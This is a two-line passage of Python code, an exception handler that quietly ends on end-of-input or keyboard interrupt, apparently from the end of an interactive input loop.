    except (EOFError, KeyboardInterrupt):
        pass
